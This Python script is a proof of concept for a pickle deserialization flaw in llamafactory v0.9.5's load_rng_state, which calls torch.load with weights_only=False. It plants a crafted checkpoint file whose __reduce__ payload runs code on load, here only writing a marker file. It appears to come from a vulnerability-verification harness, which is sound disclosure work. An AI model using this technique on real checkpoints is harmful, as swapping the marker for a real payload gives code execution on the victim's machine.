"""llamafactory v0.9.5 checkpoint.py RNG-state pickle RCE (function level, real installed package).

Upstream ``load_rng_state`` runs ``torch.load(path, map_location="cpu", weights_only=False)``
on ``<ckpt>/rng_state/rank_<n>.pt``.  A pickled reducing payload placed there executes during
the upstream ``torch.load``; afterwards the state-restore calls may fail, which is a
post-sink error (the proof has already happened).
"""

from __future__ import annotations

import json
import pickle
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402


def _materialize(marker_path: str, marker_text: str):
    Path(marker_path).write_text(marker_text, encoding="utf-8")
    return {"python": None, "numpy": None, "torch": None, "accelerator": None}


class _Payload:
    def __init__(self, marker_path: str, marker_text: str):
        self.marker_path = marker_path
        self.marker_text = marker_text

    def __reduce__(self):
        return (_materialize, (self.marker_path, self.marker_text))


def main() -> None:
    import torch  # real installed build inside the pinned llamafactory env

    import llamafactory  # noqa: F401  (pinned 0.9.5 wheel)
    from llamafactory.v1.core.utils.checkpoint import load_rng_state

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    src = poclib.upstream_path(manifest["root_cause"]["source"])
    if not src.is_file():
        poclib.fail(f"missing pinned upstream source: {src}")

    poclib.start_marker("ABSENT")
    ckpt = poclib.EVIDENCE_DIR / "ckpt"
    rng = ckpt / "rng_state"
    rng.mkdir(parents=True, exist_ok=True)
    payload = _Payload(str(poclib.MARKER_FILE), poclib.MARKER_TEXT)
    (rng / "rank_0.pt").write_bytes(pickle.dumps(payload, protocol=4))

    post_sink_error = None
    try:
        load_rng_state(str(ckpt), 0)
    except Exception as exc:  # sink has already executed the payload
        post_sink_error = f"{type(exc).__name__}: {exc}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written inside the upstream torch.load sink", post_sink_error=post_sink_error)

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+torch.load(weights_only=False)",
                "entrypoint": "llamafactory.v1.core.utils.checkpoint.load_rng_state",
                "llamafactory_version": llamafactory.__version__,
                "torch_version": torch.__version__,
                "source": poclib.rel(src),
                "source_sha256": poclib.sha256_file(src),
                "sink_line": manifest["root_cause"]["line"],
                "sink": manifest["root_cause"]["snippet"],
                "checkpoint_file": poclib.rel(rng / "rank_0.pt"),
                "payload": "pickle __reduce__ -> _materialize(marker)",
                "post_sink_error": post_sink_error,
            },
            "request_response": [
                {
                    "dir": "untrusted checkpoint dir -> load_rng_state -> torch.load(weights_only=False)",
                    "payload": "pickle reduce",
                    "result": "marker written inside the upstream sink",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
